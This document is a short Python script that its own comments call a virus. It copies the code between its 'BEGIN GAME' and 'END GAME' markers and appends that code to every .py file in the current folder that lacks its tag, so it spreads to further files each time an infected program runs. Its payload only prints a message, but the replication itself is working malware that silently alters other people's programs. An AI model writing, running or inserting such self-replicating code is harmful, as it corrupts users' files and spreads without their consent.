#!/usr/bin/env python

###I'M ALIVE###
###BEGIN GAME###
import sys, glob, re

#Getting a copy of the virus
code=[]
file=open(sys.argv[0],"r")
lines=file.readlines()
file.close()
invirus=False
for line in lines:
	if re.search('^...BEGIN GAME...',line):
		invirus=True
	elif re.search('^...END GAME...',line):
		invirus=False 
	if invirus:
		code.append(line)

#Listing another python programms
progs= glob.glob("*.py")

#Spreading
for prog in progs:
	isInfected=False
	file=open(prog,"r")
	programmlines=file.readlines()
	file.close()
	file=open(prog,"a")
	for programmline in programmlines:
		if "###I'M ALIVE###" in programmline:
			isInfected=True
	if not isInfected:
		file.write("\n###I'M ALIVE###\n")
		for virusline in code:
			file.write(virusline)
	file.close()

#Payload
print("OMG I'm infected")

###END GAME####